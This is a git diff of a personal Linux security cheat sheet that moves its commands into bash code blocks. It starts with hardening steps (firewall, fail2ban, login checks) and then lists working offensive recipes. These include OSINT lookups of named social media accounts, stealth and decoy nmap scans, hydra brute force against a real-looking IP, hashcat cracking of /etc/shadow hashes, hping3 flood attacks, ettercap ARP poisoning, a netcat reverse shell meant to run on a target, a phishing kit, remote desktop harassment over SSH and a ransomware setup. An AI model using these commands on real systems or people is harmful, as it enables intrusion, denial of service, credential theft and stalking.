@@ -3,7 +3,8 @@
 Linux servers are secure but desktops are vulnerable, some good rules for linux security hardening is essential. I made a list of security situations and application areas along with possible solutions for security of the linux system. <br />
 
 Install a firewall `$ sudo install ufw` <br />
-```
+
+```bash
  $ sudo ufw limit 22/tcp 
  $ sudo ufw allow 80/tcp 
  $ sudo ufw allow 443/tcp
@@ -17,7 +18,7 @@ Install Fail2ban (IDS): <br />
 Main files: `/etc/fail2ban/fail2ban.conf` and `/etc/fail2ban/jail.conf` <br />
 Config : `/etc/fail2ban/jail.local`
 
-```
+```bash
 [DEFAULT]
 ignoreip = 127.0.0.1/8 ::1
 bantime = 3600
@@ -31,28 +32,28 @@ enabled = true
 
 ### Uncover illegal access in linux systems:
 
-```
+```bash
     $ who
     $ w
     $ netstat -natu | grep 'ESTABLISHED'
-    $ netstat -natu | grep 'LISTEN' (anything listening to my computer or vice versa)
-    $ last (all connections)
+    $ netstat -natu | grep 'LISTEN' # (anything listening to my computer or vice versa)
+    $ last # (all connections)
     $ users
     $ nano /etc/passwd
-    $ history ( $su username )
+    $ history # ( $su username )
     $ less /home/username/.bash_history
-    $ iftop -i wlan0 ( $ip a )
+    $ iftop -i wlan0 # ( $ip a )
     $ btop
     $ lsof 
-    $ apt install chkrootkit (rootkit analyzer)
+    $ apt install chkrootkit # (rootkit analyzer)
     $ chkrootkit
 ```
 
 ### Anonymize Your Traffic With Proxychains & Tor
 
-```
+```bash
 $ sudo apt install proxychains
-$ sudo apt install tor (9050 port for tor service - not the browser but tor service)
+$ sudo apt install tor # (9050 port for tor service - not the browser but tor service)
 $ sudo vim /etc/proxychains.conf
 $ sudo systemctl enable tor.service
 $ sudo systemctl start tor.service
@@ -63,19 +64,19 @@ $ proxychains firefox dnsleak.com
 
 Goal is to minimize the number of attack surface with ref - [blog](https://null-byte.wonderhowto.com/how-to/locking-down-linux-using-ubuntu-as-your-primary-os-part-2-network-attack-defense-0185709/)
 
-```
-$ sudo systemctl disable cups-browsed (cut down port listening)
-$ sudo systemctl disable avahi-daemon (disable apple device daemons)
-$ sudo ufw enable ( and apply the rules)
+```bash
+$ sudo systemctl disable cups-browsed # (cut down port listening)
+$ sudo systemctl disable avahi-daemon # (disable apple device daemons)
+$ sudo ufw enable # ( and apply the rules)
 $ sudo ufw default deny incoming 
 $ sudo ufw default deny forwarding 
 $ sudo ufw default deny outgoing
-$ ifconfig (check network adapter name <interface> and Cloudflare DNS 1.1.1.1)
+$ ifconfig # (check network adapter name <interface> and Cloudflare DNS 1.1.1.1)
 $ sudo ufw allow out on <interface> to 1.1.1.1 proto udp port 53 comment 'allow DNS on <interface>'
 $ sudo ufw allow out on <interface> to any proto tcp port 80 comment 'allow HTTP on <interface>'
 $ sudo ufw allow out on <interface> to any proto tcp port 443 comment 'allow HTTPS on <interface>'
 set default DNS to 1.1.1.1
-$ sudo ufw default allow outgoing (default firewall rules)
+$ sudo ufw default allow outgoing # (default firewall rules)
 $ tail -f /var/log/ufw.log
 ```
 
@@ -269,23 +270,26 @@ $ sudo reboot (server is invisible to pings now)<br />
 <th>Twitter OSINT</th>
 <td>twint (twitter intelligence)<br /></td>
 <td>
-$ apt install git <br />
-$ apt install python3 <br />
-$ apt install python3-pip <br />
-$ git clone --depth=1 https://github.com/twintproject/twint.git <br />
-$ cd twint (twint can also be imported in python)<br />
-$ pip3 install . -r requirements.txt<br />
-$ twint -u florist_notes<br />
-$ twint -h (list all switches you can use)<br />
-$ twint -u florist_notes --limit 20 (last 20 tweets)<br />
-$ twint -u florist_notes -s "anime" (search through tweets)<br />
-$ twint -u florist_notes -s "book" -o book.json --json (output to a file)<br />
-$ twint -u 3blue1brown --min-likes 100 <br />
-$ twint -u 3blue1brown --since 2021-04-28 <br />
-$ twint -u 3blue1brown --year 2018 <br />
-$ twint -u 3blue1brown --year 2018 --images <br />
-$ twint -s coffee --near hamburg --Since 2021-04-21 --min-likes 15 (search tweets with switches)<br />
-$ twint -s "sun" --since 2021-04-28 -g="53.5488, 9.9872, 20km" (lat lon radius) <br />
+
+```bash
+$ apt install git 
+$ apt install python3 
+$ apt install python3-pip
+$ git clone --depth=1 https://github.com/twintproject/twint.git 
+$ cd twint # (twint can also be imported in python)<br />
+$ pip3 install . -r requirements.txt
+$ twint -u florist_notes
+$ twint -h # (list all switches you can use)
+$ twint -u florist_notes --limit 20 # (last 20 tweets)
+$ twint -u florist_notes -s "anime" # (search through tweets)
+$ twint -u florist_notes -s "book" -o book.json --json # (output to a file)
+$ twint -u 3blue1brown --min-likes 100 
+$ twint -u 3blue1brown --since 2021-04-28 
+$ twint -u 3blue1brown --year 2018 
+$ twint -u 3blue1brown --year 2018 --images 
+$ twint -s coffee --near hamburg --Since 2021-04-21 --min-likes 15 # (search tweets with switches)
+$ twint -s "sun" --since 2021-04-28 -g="53.5488, 9.9872, 20km" # (lat lon radius) 
+```
 In Python:<br />
 
 ```python
@@ -340,24 +344,29 @@ for user in mypeople:
 <th>Instagram OS!NT</th>
 <td>OS!NT on Instagram account<br /></td>
 <td>
-$ git clone https://github.com/Datalux/Osintgram <br />
-$ cd Osintgram <br />
-$ pip3 install -r requirements.txt<br />
-$ mkdir config <br />
-$ cd config <br />
-$ echo "username" > username.conf (dummy username acc)<br />
-$ echo "supersecretpassword" > pw.conf<br />
-$ echo "{}" > settings.json <br />
-In Osintgram$ :<br />
-$ python3 main.py medialab <br />
 
-We will be in Osintgram console : <br />
+```bash
+$ git clone https://github.com/Datalux/Osintgram 
+$ cd Osintgram 
+$ pip3 install -r requirements.txt
+$ mkdir config 
+$ cd config 
+$ echo "username" > username.conf # (dummy username acc)
+$ echo "supersecretpassword" > pw.conf
+$ echo "{}" > settings.json 
+ 
+ # In Osintgram $ :
 
-$ list <br />
-$ stories (download stories)<br />
-$ xdg-open sample.jpg (image viewer) <br />
-$ fwingsemail (get emails for users followed by the target) <br />
-$ addrs (get all registered addresses for target photos) <br />
+$ python3 main.py medialab 
+
+# We will be in Osintgram console : 
+
+ $ list 
+ $ stories # (download stories)
+ $ xdg-open sample.jpg # (image viewer) 
+ $ fwingsemail # (get emails for users followed by the target) 
+ $ addrs # (get all registered addresses for target photos) 
+ ```
 <br /></td>
 </tr>
 
@@ -367,14 +376,17 @@ $ addrs (get all registered addresses for target photos) <br />
 
 [NSE](https://nmap.org/book/man-nse.html). Can change speed of scanning to avoid detection.<br /></td>
 <td>
-$ nmap -sP 10.7.1.0/24 (number of hosts are up)<br />
-$ sudo nmap -sT -p 80, 443 10.7.1.0/24  (check for open ports, usually 80 or 443 ports are oprn in web server, T = TCP Connect, <ids in firewall can detect this 3 way handshake>) <br />
-$ sudo nmap -sS -p 80, 443 10.7.1.0/24 (S = stealthy, to avoid intrusion detection (IDS), no complete 3 way handshake) <br />
-$ man nmap <br />
-$ sudo nmap -O 10.7.1.226 (OS detection)<br />
-$ sudo nmap -A 10.7.1.226 (detailed) <br />
-$ sudo nmap -sS -D  10.7.1.80 10.7.1.226 (will put a decoy ip address - cover your tracks) <br />
-$ sudo nmap --script vuln 10.7.1.226 (find vulnerabilities)
+
+```bash
+$ nmap -sP 10.7.1.0/24 # (number of hosts are up)
+$ sudo nmap -sT -p 80, 443 10.7.1.0/24 # (check for open ports, usually 80 or 443 ports are oprn in web server, T = TCP Connect, <ids in firewall can detect this 3 way handshake>) 
+$ sudo nmap -sS -p 80, 443 10.7.1.0/24 # (S = stealthy, to avoid intrusion detection (IDS), no complete 3 way handshake) 
+$ man nmap 
+$ sudo nmap -O 10.7.1.226 # (OS detection)
+$ sudo nmap -A 10.7.1.226 # (detailed)
+$ sudo nmap -sS -D  10.7.1.80 10.7.1.226 # (will put a decoy ip address - cover your tracks) 
+$ sudo nmap --script vuln 10.7.1.226 # (find vulnerabilities)
+```
 <br /></td>
 </tr>
 
@@ -382,9 +394,12 @@ $ sudo nmap --script vuln 10.7.1.226 (find vulnerabilities)
 <th>find info on phone numbers with PhoneInfoga</th>
 <td>Find info on phone numbers<br /></td>
 <td>
-$ docker pull sundowndev/phoneinfoga:latest <br />
-$ docker run -it sundowndev/phoneinfoga scan -n 13526006900 <br />
-$ docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080 (to serve web UI at port 8080) <br />
+
+```bash
+$ docker pull sundowndev/phoneinfoga:latest 
+$ docker run -it sundowndev/phoneinfoga scan -n 13526006900 
+$ docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080 # (to serve web UI at port 8080) 
+```
 <br /></td>
 </tr>
 
@@ -392,12 +407,15 @@ $ docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080 (to serve web
 <th>find social media accounts with Sherlock</th>
 <td>sherlock<br /></td>
 <td>
-$ git clone https://github.com/sherlock-project/sherlock.git <br />
-$ cd sherlock <br />
-$ python3 -m pip install -r requirements.txt <br />
-$ python3 sherlock --help <br />
-$ python3 sherlock 3blue1brown <br />
-$ python3 sherlock --timeout 1 3blue1brown (creates a text file of results in dir) <br />
+
+```bash
+$ git clone https://github.com/sherlock-project/sherlock.git 
+$ cd sherlock 
+$ python3 -m pip install -r requirements.txt 
+$ python3 sherlock --help 
+$ python3 sherlock 3blue1brown 
+$ python3 sherlock --timeout 1 3blue1brown # (creates a text file of results in dir) 
+```
 <br /></td>
 </tr>
 
@@ -405,10 +423,13 @@ $ python3 sherlock --timeout 1 3blue1brown (creates a text file of results in di
 <th>Hide yourself</th>
 <td>hide yourself with ProxyChains<br /></td>
 <td>
-$ locate proxychains <br />
-$ sudo vi /etc/proxychains.conf (uncomment 'dynamic_chain' for dynamic proxies, change socks4 ip port or https ip port) <br />
-$ proxychains firefox google.com <br />
-$ proxychains nmap -sT -p 80,443 217.160.0.69 <br />
+
+```bash
+$ locate proxychains 
+$ sudo vi /etc/proxychains.conf # (uncomment 'dynamic_chain' for dynamic proxies, change socks4 ip port or https ip port) 
+$ proxychains firefox google.com
+$ proxychains nmap -sT -p 80,443 217.160.0.69 
+```
 <br /></td>
 </tr>
 
@@ -423,8 +444,12 @@ $ proxychains nmap -sT -p 80,443 217.160.0.69 <br />
 > site:starbucks.com filetype:pdf <br /><br />
 
 Google Hacking Database : [GHD](https://www.exploit-db.com/google-hacking-database) <br />
-$ theHarvester -d starbucks.com -b google (find emails and respective ip addresses)<br />
-$ theHarvester -d starbucks.com -b netcraft (lot more information)<br />
+
+```bash
+$ theHarvester -d starbucks.com -b google # (find emails and respective ip addresses)<br />
+$ theHarvester -d starbucks.com -b netcraft # (lot more information)
+```
+<br />
 <br /></td>
 </tr>
 
@@ -446,18 +471,21 @@ $ theHarvester -d starbucks.com -b netcraft (lot more information)<br />
 <th>Hacking password with Hashcat</th>
 <td>crack with hydra and hashcat<br /></td>
 <td>
-$ cd /usr/share/wordlists <br />
-$ sudo gzip -d rockyou.txt.gz (14 mil passwords) <br />
-$ sudo hydra -l "username" -P wordlist.txt \ (dictionary brute force attack - RockYou.txt) <br />
-> 45.79.49.74 ssh (firewalls might block this)<br />
-$ cat wordlist.txt (my custom wordlist) <br />
-$ cat /etc/shadow (hashes - MD5, SHA 256 , NTLM etc)<br />
-$ man hashcat <br />
-$ sudo hashcat -a 0 -m 1000 -o crackedpass.txt \ <br />
-> hashes.txt wordlist.txt  (1000 for NTLM - Windows based attacks)<br />
-$ sudo hashcat -a 0 -m 1000 -o crackpass.txt \ <br />
-"1CAGHKLGSGIUGS" wordlist.txt <br />
-$ sudo cat crackpass.txt (output / result)<br />
+
+```bash
+$ cd /usr/share/wordlists 
+$ sudo gzip -d rockyou.txt.gz (14 mil passwords) 
+$ sudo hydra -l "username" -P wordlist.txt # (dictionary brute force attack - RockYou.txt) 
+> 45.79.49.74 ssh # (firewalls might block this)
+$ cat wordlist.txt # (my custom wordlist) 
+$ cat /etc/shadow # (hashes - MD5, SHA 256 , NTLM etc)
+$ man hashcat 
+$ sudo hashcat -a 0 -m 1000 -o crackedpass.txt 
+> hashes.txt wordlist.txt # (1000 for NTLM - Windows based attacks)<br />
+$ sudo hashcat -a 0 -m 1000 -o crackpass.txt 
+"1CAGHKLGSGIUGS" wordlist.txt 
+$ sudo cat crackpass.txt # (output / result)
+```
 <br /></td>
 </tr>
 
@@ -467,19 +495,20 @@ $ sudo cat crackpass.txt (output / result)<br />
 <td>
 
 Alternate Data Streams to hide file inside another file:<br />
-$ mkdir myhiddenstuff<br />
-$ cd  myhiddenstuff<br />
-$ notepad supersecretfile.txt<br />
-$ notepad nothingtoseehere.txt <br />
-$ type supersecretfile.txt > nothingtoseehere.txt:supersecretfile.txt (this will hide supersecretfile.txt inside of nothingtoseehere.txt  with ADS)<br />
-$ notepad nothingtoseehere.txt:supersecretfile.txt <br />
-$ dir /r <br />
-$ attrib +h filename.txt (make files hidden) <br />
-<br />
-$ sudo apt install steghide -y <br />
-$ steghide embed -cf image.jpg -ef file.txt (to hide .txt inside .jpg)<br />
-$ steghide extract -sf image.jpg <br />
 
+```bash
+$ mkdir myhiddenstuff
+$ cd  myhiddenstuff
+$ notepad supersecretfile.txt
+$ notepad nothingtoseehere.txt 
+$ type supersecretfile.txt > nothingtoseehere.txt:supersecretfile.txt # (this will hide supersecretfile.txt inside of nothingtoseehere.txt  with ADS)
+$ notepad nothingtoseehere.txt:supersecretfile.txt 
+$ dir /r
+$ attrib +h filename.txt # (make files hidden) 
+$ sudo apt install steghide -y 
+$ steghide embed -cf image.jpg -ef file.txt # (to hide .txt inside .jpg)
+$ steghide extract -sf image.jpg 
+```
 <br /></td>
 </tr>
 
@@ -493,12 +522,16 @@ $ steghide extract -sf image.jpg <br />
 [low orbit ion cannon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon); [byob](https://github.com/malwaredllc/byob)<br />
 All the DDoS scripts from [H1R0GH057/Anonymous](https://github.com/H1R0GH057/Anonymous) are also in scripts/security/[ddos](../scripts/security/ddos/)<br />
 
-$ sudo hping3 -1 --flood 10.7.1.50 (ping as dos)<br />
+```bash
+$ sudo hping3 -1 --flood 10.7.1.50 # (ping as dos)
+```
 
 ICMP Flood / ping of death : but ICMP or ping response can be disabled.<br />
 
-$ sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50 (from multiple servers)<br />
-$ python saphyra.py http://10.7.1.50 <br />
+```bash
+$ sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50 (from multiple servers)
+$ python saphyra.py http://10.7.1.50 
+```
 <br /></td>
 </tr>
 
@@ -508,14 +541,19 @@ $ python saphyra.py http://10.7.1.50 <br />
 <td>
 use wireshark <br />
 ARP Poisoning with ettercap: (Man in the middle and then wireshark)<br />
-$ apt install wireshark <br />
-$ apt install nmap <br />
-$ apt install ettercap-text-only <br />
-$ sudo nmap -sn 10.0.0.0/24 (start scanning the network for ip addresses of devices) <br />
-$ sudo ettercap -T -S i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129//(S = SSL, 10.0.0.1 is router and 10.0.0.129 is the target, then use wireshark to sniff ) <br />
-In wireshark: ip.addr == 10.0.0.129 <br />
-ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target device) <br />
-Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
+
+```bash
+$ apt install wireshark 
+$ apt install nmap 
+$ apt install ettercap-text-only 
+$ sudo nmap -sn 10.0.0.0/24 # (start scanning the network for ip addresses of devices) 
+$ sudo ettercap -T -S i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129// # (S = SSL, 10.0.0.1 is router and 10.0.0.129 is the target, then use wireshark to sniff ) 
+In wireshark: ip.addr == 10.0.0.129 
+ip.addr == 10.0.0.129 && http # (to filter no SSL cert destination ip from target device)
+```
+Save wireshark sniffs as pcaps. Avoid http and telnet. 
+
+
 <br /></td>
 </tr>
 
@@ -540,22 +578,24 @@ Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
 <th>Haunt a Computer Using SSH</th>
 <td>haunt via ssh<br /></td>
 <td>
-$ export DISPLAY=:0.0 (let DISPLAY of remote be open)<br />
-$ xterm <br />
-$ sudo modprobe pcspkrc (play sound in speaker) <br />
-$ say "404 : hacked !" <br />
-$ espeak "time is running :)" <br />
-$ sudo apt install beep <br />
-$ beep -f 4000 -D 500 -l 100 -r 10 (beep warning) <br />
-$ crontab -l <br />
-$ crontab -e <br />
- uncomment  * * * * * beep .... <br />
-$ sudo xterm -maximize -e sudo tcpdump <br />
-$ for i in {1..10}; do sudo xterm -maximize -e sudo tcpdump; done <br />
-(create a `$tcpdump` window reappearing 10 times on being closed.) <br />
-$ cat warning.txt (warnings) <br />
-xterm -maximized -fullscreen -fa 'Monospace' -fs 19.31 -e whiptail --title "CRITICAL: ACTION CANNOT BE UNDONE" --msgbox "UNAUTHORIZED LOGIN! DATA SAFEGUARD SYSTEM WILL DESTROY THIS TERMINAL IN 10 SECONDS, STAY 30 FEET CLEAR TO AVOID BLAST" --topleft 23 79 <br /><br />
-$ for i in {1..10}; do firefox -new-window "hhtp://www.saikia.one/" ; done <br />
+
+```bash
+$ export DISPLAY=:0.0 # (let DISPLAY of remote be open)
+$ xterm 
+$ sudo modprobe pcspkrc # (play sound in speaker) 
+$ say "404 : hacked !" 
+$ espeak "time is running :)"
+$ sudo apt install beep 
+$ beep -f 4000 -D 500 -l 100 -r 10 # (beep warning)
+$ crontab -l 
+$ crontab -e 
+ uncomment  * * * * * beep .... 
+$ sudo xterm -maximize -e sudo tcpdump 
+$ for i in {1..10}; do sudo xterm -maximize -e sudo tcpdump; done #(create a `$tcpdump` window reappearing 10 times on being closed.) 
+$ cat warning.txt (warnings)
+xterm -maximized -fullscreen -fa 'Monospace' -fs 19.31 -e whiptail --title "CRITICAL: ACTION CANNOT BE UNDONE" --msgbox "UNAUTHORIZED LOGIN! DATA SAFEGUARD SYSTEM WILL DESTROY THIS TERMINAL IN 10 SECONDS, STAY 30 FEET CLEAR TO AVOID BLAST" --topleft 23 79 
+$ for i in {1..10}; do firefox -new-window "hhtp://www.saikia.one/" ; done 
+```
 <br /></td>
 </tr>
 
@@ -626,9 +666,13 @@ $ find /var/log/ -type f \( -name "*.log" \) -exec tail -f "$file" {} +
 <td>how to get remote access to your hacking targets<br /></td>
 <td>
 
-$ nc -lnvp 87 -s source_ip (l=listening for a connection, n= no dns, only ip; v=verbose, p=port) <br />
+```bash
+$ nc -lnvp 87 -s source_ip # (l=listening for a connection, n= no dns, only ip; v=verbose, p=port)
+```
 In the target machine (both machines must have netcat-nc): <br />
-$ nc -e /bin/bash source_ip 87 (port 87) <br />
+```bash
+$ nc -e /bin/bash source_ip 87 # (port 87) 
+```
 We want the above script to be installed in the machine and executed.<br />
 In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) <br />
 (server side) $ stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 69.164.204.158 <br />
@@ -644,8 +688,10 @@ In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/Payloads
 phishing website and emails with [blackeye](https://github.com/An0nUD4Y/blackeye)<br /></td>
 <td>
 
-$ git clone https://github.com/An0nUD4Y/blackeye <br />
-$ sudo ./blackeye.sh (setup [ngrok](https://ngrok.com/) with auth token )<br />
+```bash
+$ git clone https://github.com/An0nUD4Y/blackeye 
+$ sudo ./blackeye.sh # (setup [ngrok](https://ngrok.com/) with auth token )
+```
 Spear Phishing Attack: use SET (Social Engineering Toolkit):<br />
 (put malware - mess host file: DNS Poisoning)
 
@@ -660,25 +706,31 @@ Spear Phishing Attack: use SET (Social Engineering Toolkit):<br />
 overlay tor onion relays & routing helps keep anonymity to get to your dark web website, we meet in the middle. <br />
 Brave Browser : New Private Window with Tor <br />
 Install nginx, tor: <br />
-$ sudo apt install tor <br />
-$ sudo nano /etc/tor/torrc <br />
-Uncomment HiddenServiceDir and HiddenServicePort <br />
-$ sudo service tor stop <br />
-$ sudo service tor start <br />
-$ sudo service tor status <br />
-$ sudo cat /var/lib/tor/hidden_service/hostname (this is my dark web address) <br />
-$ sudo apt install nginx <br />
-$ sudo service nginx start <br />
-$ sudo nano /etc/nginx/nginx.conf <br />
-Uncomment : server_tokens off; server_name_in_redirect off; <br />
-just under server_tokens off: write : port_in_redirect off; <br />
-$ sudo service nginx restart <br />
-$ cd /var/www <br />
-$ cd html <br />
-$ ls <br />
-$ sudo nano index.html (remove the original html) <br />
-edit the html <br />
-$ sudo service nginx restart <br />
+
+```bash
+$ sudo apt install tor 
+$ sudo nano /etc/tor/torrc 
+
+# Uncomment HiddenServiceDir and HiddenServicePort 
+$ sudo service tor stop 
+$ sudo service tor start
+$ sudo service tor status 
+$ sudo cat /var/lib/tor/hidden_service/hostname # (this is my dark web address) 
+$ sudo apt install nginx
+$ sudo service nginx start 
+$ sudo nano /etc/nginx/nginx.conf 
+
+# Uncomment : server_tokens off; server_name_in_redirect off; 
+# just under server_tokens off: write : port_in_redirect off; 
+
+$ sudo service nginx restart 
+$ cd /var/www 
+$ cd html 
+$ ls 
+$ sudo nano index.html # (remove the original html) 
+# edit the html
+$ sudo service nginx restart 
+```
 
 <br /></td>
 </tr>
@@ -713,13 +765,16 @@ SELECT * FROM users WHERE username ='admin'-- 'AND password='password123' <br />
 
 ransomware, worms, trojan, adware, spyware with [malware showcase](https://github.com/PatrikH0lop/malware_showcase), [MalwareSourceCode](https://github.com/vxunderground/MalwareSourceCode), [theZoo - A Live Malware Repository](https://github.com/ytisf/theZoo), [Malware Database](https://github.com/Endermanch/MalwareDatabase)<br /></td>
 <td>
-$ mkdir ransomware <br />
-$ cd ransomware (encrypt the following files)<br />
-$ echo "this is a file" > file.txt <br />
-$ echo "leave me alone" > file2.txt <br />
-$ echo "another one" > hey.txt <br />
-$ echo "one more" > pleasedonthurtme.txt <br />
-$ nano ransom.py <br />
+
+```bash
+$ mkdir ransomware 
+$ cd ransomware (encrypt the following files)
+$ echo "this is a file" > file.txt 
+$ echo "leave me alone" > file2.txt 
+$ echo "another one" > hey.txt 
+$ echo "one more" > pleasedonthurtme.txt 
+$ nano ransom.py 
+```
 <br />
 
 encryption script:<br />
